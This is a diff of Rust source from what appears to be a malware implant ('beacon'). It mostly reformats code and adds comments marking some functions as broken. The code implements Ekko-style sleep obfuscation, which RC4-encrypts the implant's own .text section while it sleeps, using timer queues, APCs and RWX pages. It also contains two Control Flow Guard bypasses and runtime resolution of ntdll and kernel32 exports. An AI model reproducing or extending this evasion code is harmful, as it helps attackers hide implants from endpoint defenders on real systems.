@@ -253,6 +253,10 @@ fn mask_key_16() -> [u8; 16] {
 /// thread's parked alertable sleep, and queues an APC into the beacon's
 /// alertable window so the beacon is driven through the masked window without
 /// executing `.text` while it's ciphertext. See [`execute_foliage_apc`].
+/// ⚠ FATAL: This function has two known bugs that make it non-functional:
+/// 1. REL32 relocations in rc4_shim are not fixed up after memcpy to rc4_page
+/// 2. rc4_shim calls mask_region in .text, which is already encrypted by the time it runs
+/// Do NOT wire this into a code path. Retained for reference only.
 #[allow(dead_code)]
 fn execute_foliage_plan(plan: &FoliagePlan) {
     let secs = plan_seconds(plan);
@@ -409,6 +413,10 @@ pub fn foliage_stage() -> u8 {
 ///   6. SetEvent(done)                 — signal completion
 ///
 /// Source: https://github.com/Cracked5pider/Ekko (verified C implementation).
+/// ⚠ FATAL: This function has two known bugs that make it non-functional:
+/// 1. REL32 relocations in rc4_shim are not fixed up after memcpy to rc4_page
+/// 2. rc4_shim calls mask_region in .text, which is already encrypted by the time it runs
+/// Do NOT wire this into a code path. Retained for reference only.
 #[allow(dead_code)]
 unsafe fn execute_foliage_apc(
     region: &TextRegion,
@@ -422,43 +430,75 @@ unsafe fn execute_foliage_apc(
     // ---- Resolve the Win32/NT exports we need ----
     let nt_continue = match unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtContinue") } {
         Some(a) => a,
-        None => { FOLIAGE_STAGE.store(99, core::sync::atomic::Ordering::Release); return false; }
+        None => {
+            FOLIAGE_STAGE.store(99, core::sync::atomic::Ordering::Release);
+            return false;
+        }
     };
-    let rtl_capture_context = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"RtlCaptureContext") }
-        .or_else(|| unsafe { crate::resolve::export_addr(b"ntdll.dll", b"RtlCaptureContext") });
+    let rtl_capture_context =
+        unsafe { crate::resolve::export_addr(b"kernel32.dll", b"RtlCaptureContext") }
+            .or_else(|| unsafe { crate::resolve::export_addr(b"ntdll.dll", b"RtlCaptureContext") });
     let rtl_capture_context = match rtl_capture_context {
         Some(a) => a,
-        None => { FOLIAGE_STAGE.store(98, core::sync::atomic::Ordering::Release); return false; }
+        None => {
+            FOLIAGE_STAGE.store(98, core::sync::atomic::Ordering::Release);
+            return false;
+        }
     };
-    let virtual_protect = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect") } {
-        Some(a) => a,
-        None => { FOLIAGE_STAGE.store(97, core::sync::atomic::Ordering::Release); return false; }
-    };
-    let create_event_w = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateEventW") } {
-        Some(a) => a,
-        None => { FOLIAGE_STAGE.store(96, core::sync::atomic::Ordering::Release); return false; }
-    };
+    let virtual_protect =
+        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect") } {
+            Some(a) => a,
+            None => {
+                FOLIAGE_STAGE.store(97, core::sync::atomic::Ordering::Release);
+                return false;
+            }
+        };
+    let create_event_w =
+        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateEventW") } {
+            Some(a) => a,
+            None => {
+                FOLIAGE_STAGE.store(96, core::sync::atomic::Ordering::Release);
+                return false;
+            }
+        };
     let set_event = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"SetEvent") } {
         Some(a) => a,
-        None => { FOLIAGE_STAGE.store(95, core::sync::atomic::Ordering::Release); return false; }
+        None => {
+            FOLIAGE_STAGE.store(95, core::sync::atomic::Ordering::Release);
+            return false;
+        }
     };
-    let create_timer_queue = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateTimerQueue") } {
-        Some(a) => a,
-        None => { FOLIAGE_STAGE.store(94, core::sync::atomic::Ordering::Release); return false; }
-    };
+    let create_timer_queue =
+        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateTimerQueue") } {
+            Some(a) => a,
+            None => {
+                FOLIAGE_STAGE.store(94, core::sync::atomic::Ordering::Release);
+                return false;
+            }
+        };
     let create_timer_queue_timer =
         match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateTimerQueueTimer") } {
             Some(a) => a,
-            None => { FOLIAGE_STAGE.store(93, core::sync::atomic::Ordering::Release); return false; }
+            None => {
+                FOLIAGE_STAGE.store(93, core::sync::atomic::Ordering::Release);
+                return false;
+            }
         };
-    let delete_timer_queue = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"DeleteTimerQueue") } {
-        Some(a) => a,
-        None => { FOLIAGE_STAGE.store(92, core::sync::atomic::Ordering::Release); return false; }
-    };
+    let delete_timer_queue =
+        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"DeleteTimerQueue") } {
+            Some(a) => a,
+            None => {
+                FOLIAGE_STAGE.store(92, core::sync::atomic::Ordering::Release);
+                return false;
+            }
+        };
     let wait_for_single_object =
         match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"WaitForSingleObject") } {
             Some(a) => a,
-            None => { FOLIAGE_STAGE.store(91, core::sync::atomic::Ordering::Release); return false; }
+            None => {
+                FOLIAGE_STAGE.store(91, core::sync::atomic::Ordering::Release);
+                return false;
+            }
         };
     // RC4: instead of SystemFunction032 (needs advapi32, not always loaded),
     // we copy our rc4_shim (compiled Rust RC4) to a separate RWX page. The
@@ -470,7 +510,10 @@ unsafe fn execute_foliage_apc(
     let va_rc4: unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void =
         match va_addr_rc4 {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => { FOLIAGE_STAGE.store(88, core::sync::atomic::Ordering::Release); return false; }
+            None => {
+                FOLIAGE_STAGE.store(88, core::sync::atomic::Ordering::Release);
+                return false;
+            }
         };
     let rc4_page = unsafe { va_rc4(core::ptr::null_mut(), 0x1000, 0x3000, 0x40) }; // RWX
     if rc4_page.is_null() {
@@ -499,9 +542,7 @@ unsafe fn execute_foliage_apc(
 
     // ---- Snapshot .text[0..16] for round-trip verification ----
     let mut before = [0u8; 16];
-    unsafe {
-        core::ptr::copy_nonoverlapping(region.base as *const u8, before.as_mut_ptr(), 16)
-    };
+    unsafe { core::ptr::copy_nonoverlapping(region.base as *const u8, before.as_mut_ptr(), 16) };
 
     // ---- Build the RC4 key buffer for our rc4_shim (copied to RWX page) ----
     // rc4_shim signature: (key: *const u8, key_len: usize, buf: *mut u8, len: usize)
@@ -719,9 +760,8 @@ unsafe fn execute_foliage_apc(
 #[allow(dead_code)]
 fn mark_cfg_valid(addr: usize) -> bool {
     // Try the official API first (kernelbase.dll — Win10+).
-    let spvct = unsafe {
-        crate::resolve::export_addr(b"kernelbase.dll", b"SetProcessValidCallTargets")
-    };
+    let spvct =
+        unsafe { crate::resolve::export_addr(b"kernelbase.dll", b"SetProcessValidCallTargets") };
     // Try SetProcessValidCallTargets first. If it succeeds, done.
     if let Some(a) = spvct {
         if mark_cfg_valid_std(addr, a) {
@@ -736,36 +776,73 @@ fn mark_cfg_valid(addr: usize) -> bool {
 /// CFG bypass via SetProcessValidCallTargets (kernelbase.dll).
 #[allow(dead_code)]
 fn mark_cfg_valid_std(addr: usize, spvct: usize) -> bool {
-    let nt_query_vm = match unsafe {
-        crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory")
-    } {
-        Some(a) => a,
-        None => return false,
-    };
+    let nt_query_vm =
+        match unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory") } {
+            Some(a) => a,
+            None => return false,
+        };
 
     #[repr(C)]
-    struct Mbi { base: *mut c_void, alloc_base: *mut c_void, alloc_prot: u32, _p1: u32,
-        reg_size: usize, state: u32, prot: u32, typ: u32, _p2: u32 }
+    struct Mbi {
+        base: *mut c_void,
+        alloc_base: *mut c_void,
+        alloc_prot: u32,
+        _p1: u32,
+        reg_size: usize,
+        state: u32,
+        prot: u32,
+        typ: u32,
+        _p2: u32,
+    }
     #[repr(C)]
-    struct CfgInfo { offset: usize, flags: usize }
+    struct CfgInfo {
+        offset: usize,
+        flags: usize,
+    }
 
     type QueryVm = unsafe extern "system" fn(
-        *mut c_void, *const c_void, u32, *mut c_void, usize, *mut usize) -> i32;
-    type SpvctFn = unsafe extern "system" fn(
-        *mut c_void, *const c_void, usize, u32, *const CfgInfo) -> i32;
+        *mut c_void,
+        *const c_void,
+        u32,
+        *mut c_void,
+        usize,
+        *mut usize,
+    ) -> i32;
+    type SpvctFn =
+        unsafe extern "system" fn(*mut c_void, *const c_void, usize, u32, *const CfgInfo) -> i32;
 
     let query: QueryVm = unsafe { core::mem::transmute(nt_query_vm) };
     let spvct_fn: SpvctFn = unsafe { core::mem::transmute(spvct) };
     const CUR: *mut c_void = -1isize as *mut c_void;
 
-    let mut mbi = Mbi { base: core::ptr::null_mut(), alloc_base: core::ptr::null_mut(),
-        alloc_prot: 0, _p1: 0, reg_size: 0, state: 0, prot: 0, typ: 0, _p2: 0 };
+    let mut mbi = Mbi {
+        base: core::ptr::null_mut(),
+        alloc_base: core::ptr::null_mut(),
+        alloc_prot: 0,
+        _p1: 0,
+        reg_size: 0,
+        state: 0,
+        prot: 0,
+        typ: 0,
+        _p2: 0,
+    };
     let mut rl: usize = 0;
-    if unsafe { query(CUR, addr as *const c_void, 0,
-        &mut mbi as *mut Mbi as *mut c_void, core::mem::size_of::<Mbi>(), &mut rl) } < 0 {
+    if unsafe {
+        query(
+            CUR,
+            addr as *const c_void,
+            0,
+            &mut mbi as *mut Mbi as *mut c_void,
+            core::mem::size_of::<Mbi>(),
+            &mut rl,
+        )
+    } < 0
+    {
         return false;
     }
-    if mbi.state != 0x1000 || mbi.typ != 0x1000000 { return false; }
+    if mbi.state != 0x1000 || mbi.typ != 0x1000000 {
+        return false;
+    }
 
     // 16-byte aligned offset from allocation base.
     let offset = (addr.wrapping_sub(mbi.alloc_base as usize)) & !0xF;
@@ -776,48 +853,119 @@ fn mark_cfg_valid_std(addr: usize, spvct: usize) -> bool {
 /// Fallback CFG bypass via NtSetInformationVirtualMemory (ntdll).
 #[allow(dead_code)]
 fn mark_cfg_valid_nt(addr: usize) -> bool {
-    let nt_query_vm = match unsafe {
-        crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory")
-    } { Some(a) => a, None => return false };
+    let nt_query_vm =
+        match unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory") } {
+            Some(a) => a,
+            None => return false,
+        };
     let nt_set_vm = match unsafe {
         crate::resolve::export_addr(b"ntdll.dll", b"NtSetInformationVirtualMemory")
-    } { Some(a) => a, None => return true };
+    } {
+        Some(a) => a,
+        None => return true,
+    };
 
     #[repr(C)]
-    struct Mbi { base: *mut c_void, alloc_base: *mut c_void, alloc_prot: u32, _p1: u32,
-        reg_size: usize, state: u32, prot: u32, typ: u32, _p2: u32 }
+    struct Mbi {
+        base: *mut c_void,
+        alloc_base: *mut c_void,
+        alloc_prot: u32,
+        _p1: u32,
+        reg_size: usize,
+        state: u32,
+        prot: u32,
+        typ: u32,
+        _p2: u32,
+    }
     #[repr(C)]
-    struct Cti { offset: usize, flags: u32 }
+    struct Cti {
+        offset: usize,
+        flags: u32,
+    }
     #[repr(C)]
-    struct Mre { va: *mut c_void, nb: usize }
+    struct Mre {
+        va: *mut c_void,
+        nb: usize,
+    }
     #[repr(C)]
-    struct Vmi { n: u32, _pad: u32, z1: usize, z2: usize, pt: *mut Cti, out: *mut u32 }
+    struct Vmi {
+        n: u32,
+        _pad: u32,
+        z1: usize,
+        z2: usize,
+        pt: *mut Cti,
+        out: *mut u32,
+    }
 
     type QueryVm = unsafe extern "system" fn(
-        *mut c_void, *const c_void, u32, *mut c_void, usize, *mut usize) -> i32;
-    type SetVm = unsafe extern "system" fn(
-        *mut c_void, u32, usize, *mut Mre, *mut Vmi, u32) -> i32;
+        *mut c_void,
+        *const c_void,
+        u32,
+        *mut c_void,
+        usize,
+        *mut usize,
+    ) -> i32;
+    type SetVm = unsafe extern "system" fn(*mut c_void, u32, usize, *mut Mre, *mut Vmi, u32) -> i32;
 
     let query: QueryVm = unsafe { core::mem::transmute(nt_query_vm) };
     let set: SetVm = unsafe { core::mem::transmute(nt_set_vm) };
     const CUR: *mut c_void = -1isize as *mut c_void;
 
-    let mut mbi = Mbi { base: core::ptr::null_mut(), alloc_base: core::ptr::null_mut(),
-        alloc_prot: 0, _p1: 0, reg_size: 0, state: 0, prot: 0, typ: 0, _p2: 0 };
+    let mut mbi = Mbi {
+        base: core::ptr::null_mut(),
+        alloc_base: core::ptr::null_mut(),
+        alloc_prot: 0,
+        _p1: 0,
+        reg_size: 0,
+        state: 0,
+        prot: 0,
+        typ: 0,
+        _p2: 0,
+    };
     let mut rl: usize = 0;
-    if unsafe { query(CUR, addr as *const c_void, 0,
-        &mut mbi as *mut Mbi as *mut c_void, core::mem::size_of::<Mbi>(), &mut rl) } < 0 {
+    if unsafe {
+        query(
+            CUR,
+            addr as *const c_void,
+            0,
+            &mut mbi as *mut Mbi as *mut c_void,
+            core::mem::size_of::<Mbi>(),
+            &mut rl,
+        )
+    } < 0
+    {
         return false;
     }
-    if mbi.state != 0x1000 || mbi.typ != 0x1000000 { return false; }
+    if mbi.state != 0x1000 || mbi.typ != 0x1000000 {
+        return false;
+    }
 
     let offset = (addr.wrapping_sub(mbi.alloc_base as usize)) & !0xF;
     let mut cti = Cti { offset, flags: 1 };
-    let mut mre = Mre { va: mbi.alloc_base, nb: mbi.reg_size };
+    let mut mre = Mre {
+        va: mbi.alloc_base,
+        nb: mbi.reg_size,
+    };
     let mut out: u32 = 0;
-    let mut vmi = Vmi { n: 1, _pad: 0, z1: 0, z2: 0, pt: &mut cti, out: &mut out };
+    let mut vmi = Vmi {
+        n: 1,
+        _pad: 0,
+        z1: 0,
+        z2: 0,
+        pt: &mut cti,
+        out: &mut out,
+    };
 
-    let st = unsafe { set(CUR, 4, 1, &mut mre, &mut vmi, core::mem::size_of::<Vmi>() as u32) };
+    let st = unsafe {
+        set(
+            CUR,
+            4,
+            1,
+            &mut mre,
+            &mut vmi,
+            core::mem::size_of::<Vmi>() as u32,
+        )
+    };
     st >= 0 || st == -0x3FBBi32
 }
 
@@ -829,13 +977,12 @@ fn mark_cfg_valid_nt(addr: usize) -> bool {
 /// still cleartext (the RC4 hasn't happened yet). The danger window is only
 /// during the NtWait (when .text is ciphertext), and during that window the
 /// thunk executes from the allocated page (not .text), not this shim.
+/// ⚠ FATAL: This function has two known bugs that make it non-functional:
+/// 1. REL32 relocations in rc4_shim are not fixed up after memcpy to rc4_page
+/// 2. rc4_shim calls mask_region in .text, which is already encrypted by the time it runs
+/// Do NOT wire this into a code path. Retained for reference only.
 #[allow(dead_code)]
-unsafe extern "system" fn rc4_shim(
-    key: *const u8,
-    key_len: usize,
-    buf: *mut u8,
-    len: usize,
-) {
+unsafe extern "system" fn rc4_shim(key: *const u8, key_len: usize, buf: *mut u8, len: usize) {
     if key.is_null() || buf.is_null() || key_len < 16 || len == 0 {
         return;
     }
@@ -1138,6 +1285,10 @@ pub(crate) unsafe fn raw_create_thread(
 /// # Safety
 /// `param` is a `*mut FoliageParams`. This function takes ownership and
 /// reclaims the box before returning. Mutates the implant's `.text`.
+/// ⚠ FATAL: This function has two known bugs that make it non-functional:
+/// 1. REL32 relocations in rc4_shim are not fixed up after memcpy to rc4_page
+/// 2. rc4_shim calls mask_region in .text, which is already encrypted by the time it runs
+/// Do NOT wire this into a code path. Retained for reference only.
 #[allow(dead_code)]
 unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     // Take ownership of the FoliageParams + VerifyState boxes up front so we
@@ -1167,40 +1318,43 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     }
 
     // ---- THUNK WIRED: build PIC thunk, execute from RWX page ----
-    let nt_alloc_addr = match unsafe {
-        crate::resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory")
-    } {
-        Some(a) => a,
-        None => {
-            if !verify_raw.is_null() { let _ = Box::from_raw(verify_raw); }
-            return 1;
-        }
-    };
-    let nt_free_addr = match unsafe {
-        crate::resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory")
-    } {
-        Some(a) => a,
-        None => {
-            if !verify_raw.is_null() { let _ = Box::from_raw(verify_raw); }
-            return 1;
-        }
-    };
+    let nt_alloc_addr =
+        match unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory") } {
+            Some(a) => a,
+            None => {
+                if !verify_raw.is_null() {
+                    let _ = Box::from_raw(verify_raw);
+                }
+                return 1;
+            }
+        };
+    let nt_free_addr =
+        match unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory") } {
+            Some(a) => a,
+            None => {
+                if !verify_raw.is_null() {
+                    let _ = Box::from_raw(verify_raw);
+                }
+                return 1;
+            }
+        };
 
     // ---- Resolve SystemFunction032 from advapi32.dll ---------------------
-    let sf032_addr = match unsafe {
-        crate::resolve::export_addr(b"advapi32.dll", b"SystemFunction032")
-    } {
-        Some(a) => a,
-        None => {
-            let delay: i64 = -((secs as i64).saturating_mul(10_000_000));
-            const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
-            let _ = unsafe {
-                raw.nt_wait_for_single_object(INVALID_HANDLE, 0, &delay as *const i64 as usize)
-            };
-            if !verify_raw.is_null() { let _ = Box::from_raw(verify_raw); }
-            return 0;
-        }
-    };
+    let sf032_addr =
+        match unsafe { crate::resolve::export_addr(b"advapi32.dll", b"SystemFunction032") } {
+            Some(a) => a,
+            None => {
+                let delay: i64 = -((secs as i64).saturating_mul(10_000_000));
+                const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
+                let _ = unsafe {
+                    raw.nt_wait_for_single_object(INVALID_HANDLE, 0, &delay as *const i64 as usize)
+                };
+                if !verify_raw.is_null() {
+                    let _ = Box::from_raw(verify_raw);
+                }
+                return 0;
+            }
+        };
 
     // Build the PIC RC4 wrapper.
     let (wrapper_bytes, wrapper_len) = crate::pic_thunk::build_rc4_sf032_wrapper(sf032_addr);
@@ -1228,24 +1382,40 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     const MEM_COMMIT: u32 = 0x1000;
     const MEM_RESERVE: u32 = 0x2000;
     const PAGE_EXECUTE_READWRITE: u32 = 0x40;
-    let st = unsafe { nt_alloc(!0usize, &mut page, &mut page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
+    let st = unsafe {
+        nt_alloc(
+            !0usize,
+            &mut page,
+            &mut page_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        )
+    };
     if st < 0 || page.is_null() {
         let _ = unsafe { Box::from_raw(params) };
-        if !verify_raw.is_null() { let _ = Box::from_raw(verify_raw); }
+        if !verify_raw.is_null() {
+            let _ = Box::from_raw(verify_raw);
+        }
         return 1;
     }
 
     // Place the RC4 wrapper at the start of the page, then the thunk right after.
     let wrapper_addr = page as usize;
     let thunk_addr = wrapper_addr + wrapper_len;
-    unsafe { core::ptr::copy_nonoverlapping(wrapper_bytes.as_ptr(), page as *mut u8, wrapper_len); }
+    unsafe {
+        core::ptr::copy_nonoverlapping(wrapper_bytes.as_ptr(), page as *mut u8, wrapper_len);
+    }
 
     // Build and copy the PIC thunk.
     let thunk = crate::pic_thunk::build_mask_thunk();
-    unsafe { core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), thunk_addr as *mut u8, thunk.len); }
+    unsafe {
+        core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), thunk_addr as *mut u8, thunk.len);
+    }
 
     // Wire rc4_mask to the wrapper.
-    unsafe { (*params).rc4_mask = wrapper_addr; }
+    unsafe {
+        (*params).rc4_mask = wrapper_addr;
+    }
 
     // Call the thunk.
     let thunk_fn: unsafe extern "system" fn(usize) -> u32 =
@@ -1253,12 +1423,18 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     let _ = unsafe { thunk_fn(params as usize) };
 
     // Free the RWX page.
-    type NtFreeFn =
-        unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32) -> i32;
+    type NtFreeFn = unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32) -> i32;
     let nt_free: NtFreeFn = unsafe { core::mem::transmute(nt_free_addr) };
     const MEM_RELEASE: u32 = 0x8000;
     let mut free_size: usize = 0;
-    let _ = unsafe { nt_free(0xFFFF_FFFF_FFFF_FFFF, &mut page, &mut free_size, MEM_RELEASE) };
+    let _ = unsafe {
+        nt_free(
+            0xFFFF_FFFF_FFFF_FFFF,
+            &mut page,
+            &mut free_size,
+            MEM_RELEASE,
+        )
+    };
 
     // Reclaim the leaked params block.
     let _ = unsafe { Box::from_raw(params) };
